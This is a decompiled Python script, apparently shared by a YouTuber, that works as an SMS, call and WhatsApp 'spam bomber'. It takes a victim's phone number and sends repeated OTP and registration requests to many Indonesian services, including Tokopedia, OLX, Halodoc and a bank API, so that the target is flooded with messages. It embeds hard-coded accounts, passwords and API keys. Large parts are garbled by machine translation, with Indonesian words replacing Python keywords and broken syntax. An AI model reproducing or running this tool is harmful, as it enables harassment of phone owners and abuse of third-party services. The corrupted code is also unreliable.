# Dekompilasi Oleh Bot WhatsApp 
kami
#Buat Belajar Juga Ya Ngab Biar Jago

# Opem Source Code Spesial 1k Subs

#!/usr/bin/python2.7

# -*- coding: utf-8 -*-

import os,sys,time,requests,re,json

dari  colorama  import  Fore , Back , init
kami
B   =   Depan . BIRU
kami
W = Fore.WHITE

R = Fore.RED

G = Fore.GREEN

BL = Fore.BLACK

Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text

ua=requests.get('http://xenzi-ganz.6te.net/User-Agent.php').text

localtime=time.asctime(time.localtime(time.time()))

Hijau="\033[1;92m "

putih="\033[1;97m"

abu="\033[1;90m"

kuning="\033[1;93m"

ungu="\033[1;95m"

merah="33[37;1m"

biru="\033[1;96m"

#Tulisan Background Merah

bg="\033[1;0m\033[1;41mText\033[1;0m"

def countdown(time_sec):

	try:

		while time_sec:

			mins, secs = divmod(time_sec,60)

			timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Meluncurkan Roket Dalam \033[1;92m{:02d}:{:02d}'.format(mins,secs)

			print(timeformat,end='\r')

			time.sleep(1)

			time_sec -= 1

		print (f"{W}[{R}•{W}] Sending Spam{abu}....              ")

		time.sleep(5)

	except KeyboardInterrupt:

                print (f"{W}Program Terminated [{R}!{W}]")

def load():

	load = '█'

	count = 0

	for t in range(6):

	    time.sleep(5)

	    print(f'\r{R} > {Y}Meluncurkan Roket {R}({biru}{t}{R}){Y} ', end='', flush=True)

	    count += 1

	    if count == 1:

	    	count = 0

	    	load += '█'

def logo():

	os.system("clear")

	print(f"{biru}Subscribe Channel {W}Aing Dulu Sluur{biru} ! ! !{G}")

	os . sistem ( "xdg-buka    "    https : //    youtube .com    / channel /  UCXAKJ3xv25Q2Blnpl4hD6CA )   
kami
	waktu . tidur ( 10 )

	os.system("clear")

	print (f"""{ungu}	|

{ungu}       ( )

{ungu}      / _ \    {biru}╔╗ {W}┬─┐┬ ┬┌┬┐┌─┐┬   {biru}╔═╗{W}╔═╗╦ ╦

{ungu}     |.o '.|   {biru}╠╩╗{W}├┬┘│ │ │ ├─┤│{R}───{biru}╚═╗{W}║  ║║║

{ungu}     |'._.'|   {biru}╚═╝{W}┴└─└─┘ ┴ ┴ ┴┴─┘ {biru}╚═╝{W}╚═╝╚╩╝ v{Y}2

{ungu}     | {Y}2{W}.{Y}9{ungu} |{W}   [{Y}•{W}] Info sc{R} :{W} Brutal Spam {R}({biru}sms,call,wa{R})

{ungu}   .'|  |  |`. {W}[{Y}•{W}] Info Creator{R} :{W} Ammar

{ungu}  (  |  |  |  )

{ungu}  |,-'--|--'-.|{R}   ({W} Version Script : 2.9 Decompile{R} )

{abu} ------------------------------------------------------

	 {W}[{Y}•{W}] Ketik{R}:{G} CTRL {R}+{G}z {W}Untuk Berhenti

	 {W}[{Y}•{W}] Ip Kamu{R}:{Y} {ip}

	 {W}[{Y}•{W}] Waktu/Jam{R}:{Y} {localtime}

""")

	for jum in range(int(sys.argv[2])):

		wa(sys.argv[1])

		time.sleep(5)

def wa(nomor):

	countdown(10)

	Ammar={"Host":"www.autofun.co.id","content-length":"84","accept":"*/*","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.autofun.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.autofun.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	Ganz=json.dumps({"phoneNum":"620"+nomor,"languageCode":"id-id","countryCode":"id","platform":2})

	Gwganz=requests.post("https://www.autofun.co.id/v2/captcha/sms",headers=Ammar,data=Ganz).text

	heading = {"Host":"evermos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	ammarganz=json.dumps({"phone":"62"+nomor})

	req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text

	req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text

	req=requests.post("https://evermos.com/api/register/phone-registration",headers=heading,data=ammarganz).text

	ol={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","origin":"https://dashboard.olsera.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	ol2=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":3})

	ol3=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=ol,data=ol2).text

	AmmarGamteng=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "wa","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text

	AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text

	AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}

	wkwk=json.dumps({"account":nomor})

	req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text

	kepala={"Host":"m.redbus.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","accept":"*/*","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.redbus.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}

	gw=requests.get("https://m.redbus.id/api/getOtp?number="+nomor+"&cc=62&whatsAppOpted=true&disableOtpFlow=undefined",headers=kepala).text

	head={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://dashboard.olsera.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	dat=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":2})

	pos=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=head,data=dat).text

	headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}

	site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text

	search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)

	datap = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}

	sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = datap)

	Xen=requests.get("https://m.redbus.id/api/getOtp?number=0"+nomor+"&cc=62&whatsAppOpted=true",headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"}).text

	req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":nomor}).text

	ol={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","origin":"https://dashboard.olsera.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	ol2=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":3})

	ol3=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=ol,data=ol2).text

	ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}

	data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor})

	req=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text

	requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text

	Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text

	Bn=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text

	requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text

	Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text

	ol={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","origin":"https://dashboard.olsera.co.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	ol2=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":3})

	ol3=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=ol,data=ol2).text

	Ammar={"Host":"www.autofun.co.id","content-length":"84","accept":"*/*","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.autofun.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.autofun.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	Ganz=json.dumps({"phoneNum":"620"+nomor,"languageCode":"id-id","countryCode":"id","platform":2})

	Gwganz=requests.post("https://www.autofun.co.id/v2/captcha/sms",headers=Ammar,data=Ganz).text

	spm=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text

	dekoruma={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	dekor=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})

	dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers=dekoruma,data=dekor).text

	jenius=requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text

	payfaz=requests.post("https://api.payfazz.com/v2/phoneVerifications",data={"phone":"0"+nomor},headers={"Host": "api.payfazz.com", "content-length": "17", "accept": "*/*", "origin": "https://www.payfazz.com","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "http://www.payfazz.com/register/BEN6ZF74XL", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text

	xen8={'Host': 'www.halodoc.com','x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json, text/plain, */*','save-data': 'on','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}

	xen9=json.dumps({"phone_number": "+62"+nomor,"channel": "sms"})

	req4 = requests.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', headers=xen8,data=xen9).text

	xen6={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}

	xen7=json.dumps({"user": {"phone": "0"+nomor}})

	req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers=xen6,data=xen7).text

	pizza={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}

	pizza2=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})

	pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers=pizza,data=pizza2).text

	head={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content- ketik":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/ 537.36 (KHTML, seperti Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://dashboard.olsera.co.id", "sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera .co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,id-AS;q=0.8,en;q=0.7"}

	dat=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format" :nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":" ","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":2})

	pos=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=head,data=dat).text

	lummo={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com" ,"sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web. lummoshop.com/","accept-encoding":"gzip, deflate, br"}

	gas=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS" ,"userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n generateOtp(generateOtpInput: $generateOtpInput) {\n phoneNumber\n }\n}\n"})

	gaskeun=requests.post("https://api.tokko.io/graphql",headers=lummo,data=gas).text

	oyo={"Host":"www.oyorooms.com","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","xsrf-token":"EQkWLkwz-wsOdxssltZ6pIkc9OAbnpVBea-A","access_token":"SFI4TER1WVRbTENG0enYtalp" ":"*/*","origin":"https://www.oyorooms.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors", "sec-fetch-dest":"empty","referer":"https://www.oyorooms.com/login","accept-encoding":"gzip, deflate, br"}

	oyo2=json.dumps({"phone":nomor,"country_code":"+62","country_iso_code":"ID","nod":4,"send_otp":True,"devise_role":"Consumer_Guest"} )

	oyony=requests.post("https://www.oyorooms.com/api/pwa/generateByPhone?locale=id",headers=oyo,data=oyo2).text

	ganz={"Host":"wapi.ruparupa.com","content-type":"application/json","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/87.0.4280.101 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","origin":"https ://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"kosong",,"referer ":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q =0.9,en-US;q=0.8,en;q=0.7"}

	gamteng=json.dumps({"phone":"0"+nomor,"action":"social-login","channel":"message","email":"","token":""," customer_id":"0","is_resend":0})

	aing=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers=ganz,data=gamteng).text

	jag2={"Host":"id.jagreward.com","Connection":"keep-alive","Terima":"*/*","User-Agent":"Mozilla/5.0 (Linux; Android 10 ; M2006C3LG) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Sec-Fetch-Site":"asal yang sama",,"Sec-Fetch-Mode":"cors"," Sec-Fetch-Dest":"empty","Referer":"https://id.jagreward.com/member/register/","Accept-Encoding":"gzip, deflate, br","Terima-Bahasa ":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

	jag=requests.get("https://id.jagreward.com/member/verify-mobile/"+nomor+"/",headers=jag2).text

	Subs={"Host":"api.kredinesia.id","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG ) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www. kredinesia.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"kosong",,"referer":"https: //www.kredinesia.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en ;q=0,7",}

	subrek=json.dumps({"phone":nomor,"captcha":""})

	mar=requests.post("https://api.kredinesia.id/v1/login/verificationCode",headers=Subs,data=subrek).text

	AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms"," phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera- sidik jari": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, seperti Gecko Chrome/) Versi/4.0 59.0.3071.125 Mobile Safari/537.36", "content-type": "application/json"}).text

	AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/ polos, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":" https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"kosong"," referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}

	wkwk=json.dumps({"akun":nomor})

	req = request.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text

	head={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content- ketik":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/ 537.36 (KHTML, seperti Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://dashboard.olsera.co.id", "sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera .co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,id-AS;q=0.8,en;q=0.7"}

	dat=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format" :nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":" ","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":2})

	pos=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=head,data=dat).text

	ol={"Host":"api-dash.olsera.co.id","content-length":"337","accept":"application/json, text/plain, */*","content- ketik":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ( KHTML, seperti Gecko) Chrome/94.0.4606.85 Safari/537.36","sec-ch-ua-platform":"Linux","origin":"https://dashboard.olsera.co.id","sec- fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://dashboard.olsera.co. id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

